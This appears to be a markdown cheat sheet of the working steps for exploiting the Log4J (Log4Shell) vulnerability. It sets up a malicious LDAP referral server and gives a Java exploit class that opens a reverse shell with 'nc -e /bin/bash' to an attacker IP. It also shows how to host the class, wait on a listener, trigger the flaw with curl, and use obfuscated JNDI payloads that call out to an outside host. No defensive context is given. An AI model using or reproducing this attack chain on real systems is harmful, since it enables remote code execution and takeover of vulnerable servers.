# Log4J exploit

## Install and start LDAP server that redirects to your exploit class:
https://github.com/mbechler/marshalsec

```
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP:8000/#Exploit"
```

## Save exploit class to Exploit.java:
```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP 1337");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## Compile exploit to Javacode:
```
javac Exploit.java -source 8 -target 8
```

## Host Javacode with python:
```
python3 -m http.server
```

## Wait for reverse shell:
```
nc -lnvp 1337
```

## Trigger Log4J to connect with your LDAP:
```
curl 'http://TARGET:8983/?foo=$\{jndi:ldap://YOUR.IP:1389/Exploit\}'
```

```
${jndi:${lower:l}${lower:d}a${lower:p}://xx.interactsh.com/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.interactsh.com/poc}
```